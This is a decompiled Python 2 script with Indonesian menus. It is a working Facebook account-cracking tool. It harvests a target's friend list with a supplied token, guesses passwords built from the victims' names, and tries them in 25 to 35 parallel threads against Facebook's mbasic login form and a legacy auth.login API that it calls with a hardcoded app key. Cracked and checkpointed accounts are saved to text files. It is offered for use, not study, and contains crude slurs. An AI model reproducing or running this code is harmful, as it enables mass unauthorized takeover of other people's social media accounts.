# coding:utf-8
# decompile by itsuki
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: hamzah
import requests, bs4, sys, os, subprocess, requests, sys, random, time, re, base64, json
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''

def banner():
    print ' _______ ______  _______ [M] MULTI | CREATE\n |  |  | |_____] |______ [B] BRUTE | TO\n |  |  | |_____] |       [F] FORCE | BOY HAMZAH'


host = 'https://mbasic.facebook.com'
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
ok = []
cp = []
ttl = []
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit('Wrong Cookies')


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        logs()
    else:
        logs()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def logs():
    os.system('clear')
    banner()
    print '1.) Masuk Menggunakan Token Facebook'
    print '2.) Masuk Menggunakan Cookie Facebook'
    print '3.) Perbarui Script'
    print '0.) Keluar Dari Program'
    sek = raw_input('\n> ')
    if sek == '':
        print '\nSalah'
        logs()
    elif sek == '1':
        log_token()
    elif sek == '2':
        gen()
    elif sek == '3':
        updatesc()
    elif sek == '0':
        exit()
    else:
        print '\nSalah'
        logs()


def log_token():
    toket = raw_input('\nToken Facebook > ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\nBerhasil Masuk'
        time.sleep(2)
        bot_follow()
    except KeyError:
        print '\nToken Invalid'
        time.sleep(2)
        os.system('clear')
        logs()


def gen():
    cookie = raw_input('\nCookie Facebook > ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\nTidak Ada Koneksi'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\nBerhasil Masuk'
    time.sleep(2)
    bot_follow()
    return


def bot_follow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\nToken invalid'
        logs()

    menu()


def menu():
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except Exception as e:
        print '\nBermasalah > %s' % e
        logs()

    ip = requests.get('https://api.ipify.org').text
    os.system('clear')
    banner()
    print '\t   IP KAMU > [ \x1b[0;92m' + ip + '\x1b[0m ]'
    print ''
    print 'Haii [ \x1b[0;92m' + nama + ' \x1b[0m]'
    print ''
    print '1.) Dump ID Publik'
    print '2.) Mulai Crack'
    print '0.) Keluar Dari Program Dan Hapus Token/Cookie'
    choose_menu()


def choose_menu():
    r = raw_input('\n>  ')
    if r == '':
        print '\nSalah'
        time.sleep(2)
        menu()
    elif r == '1':
        publik()
    elif r == '2':
        pilihcrack()
    elif r == '0':
        try:
            os.system('rm -rf login.txt')
            exit()
        except Exception as e:
            print '\nFile Bermasalah > %s' % e

    else:
        print '\nSalah'
        time.sleep(2)
        menu()

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\nCookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        idt = raw_input('\nID Publik > ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print 'Nama > ' + op['name']
        except KeyError:
            print '\nID Tidak Ada'
            raw_input('\nTekan Enter Untuk Kembali')
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(10000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        qq = (op['first_name'] + '.mbf').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print 'ID Yang Di Dapat > %s' % len(id)
        print '\nBerhasil Dump ID Publik'
        print '\nSalin Nama File > %s' % qq
        raw_input('\nTekan Enter Untuk Kembali')
        menu()
    except Exception as e:
        exit('\nBermasalah > %s' % e)


def generate(text):
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'bangladesh' in ips:
                    results.append('sayang')
                    results.append('anjing')

    return results


def mbasic(em, pas, hosts):
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

class crack:
    os.system('clear')
    banner()

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\nIngin Menggunakan Sandi Manual/Otomotis.? [m/o]'
        while True:
            f = raw_input('\n> ')
            if f == '':
                continue
            elif f in ('m', 'M'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('\nNama File > ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '%s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\n[ CONTOH SANDI ] sayang,pengen,ngentot'
                self.pwlist()
                break
            elif f in ('o', 'O'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('\nNama File > ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '%s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e

                print '\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n'
                ThreadPool(25).map(self.main, self.fl)
                os.remove(self.apk)
                print '\nSelesai'
                results(self.ada, self.cp)
                break

    def pwlist(self):
        self.pw = raw_input('\nSandi > ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n'
            ThreadPool(25).map(self.main, self.fl)
            os.remove(self.apk)
            results(self.ada, self.cp)
            print '\nSelesai'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r\x1b[0;92mRESULTS %s - %s               \x1b[0m' % (fl.get('id'), i)
                    self.ada.append('%s - %s' % (fl.get('id'), i))
                    open('results.txt', 'a+').write('%s - %s\n' % (fl.get('id'), i))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[0;93mCHECK %s - %s               \x1b[0m' % (fl.get('id'), i)
                    self.cp.append('%s - %s' % (fl.get('id'), i))
                    open('check.txt', 'a+').write('%s - %s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[0m[%s-%s] \x1b[0;92mRESULTS [%s] \x1b[0;93mCHECK [%s]' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class bapi:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0
        self.krah()

    def krah(self):
        print '\nIngin Menggunakan Sandi Manual/Otomatis.? [m/o]'
        while True:
            f = raw_input('\n> ')
            if f in ('', ' '):
                print '\nSalah'
                continue
            elif f in ('m', 'M'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('\nNama File > ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '%s' % e
                            continue

                    self.fl = []
                    print '\n[ CONTOH SANDI ] sayang,pengen,ngentot'
                    self.pw = raw_input('\nSandi > ').split(',')
                    if len(self.pw) == 0:
                        continue
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': self.pw})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n'
                ThreadPool(35).map(self.brute, self.fl)
                results(self.ok, self.cp)
                print '\nSelesai'
                break
            elif f in ('o', 'O'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('\nNama File > ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except:
                    continue

                print '\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n'
                ThreadPool(35).map(self.brute, self.fl)
                os.remove(self.apk)
                results(self.ok, self.cp)
                break

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + ' - ' + password)
            print '\r\x1b[0;92mRESULTS %s - %s %s               \x1b[0m' % (username, password, N)
            ok.append(username + ' - ' + password)
            save = open('results.txt', 'a')
            save.write(str(username) + ' - ' + str(password) + '\n')
            save.close()
            return True
        if 'www.facebook.com' in response.json()['error_msg']:
            self.cp.append(username + ' - ' + password)
            print '\r\x1b[0;93mCHECK %s - %s %s               \x1b[0m' % (username, password, N)
            save = open('check.txt', 'a+')
            save.write(str(username) + ' - ' + str(password) + '\n')
            save.close()
            return True
        return False

    def brute(self, fl):
        if self.setpw == False:
            self.loop += 1
            for pw in fl['pw']:
                username = fl['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r\x1b[0m[%s-%s] \x1b[0;92mRESULTS [%s] \x1b[0;93mCHECK [%s]' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r\x1b[0m[%s-%s] \x1b[0;92mRESULTS [%s] \x1b[0;93mCHECK [%s]' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()

def results(Anak, Lonte):
    if len(Anak) != 0:
        print '\nOK > ' + str(len(Anak))
    if len(Lonte) != 0:
        print '\nCP > ' + str(len(Lonte))
    if len(Anak) == 0 and len(Lonte) == 0:
        print '\n'
        print 'Tidak Ada Hasil'


def updatesc():
    os.system('clear')
    banner()
    jalan('\nMemperbarui Script')
    os.system('git pull origin master')
    jalan('\nMemperbarui Script Berhasil')
    exit()


if __name__ == '__main__':
    menu()
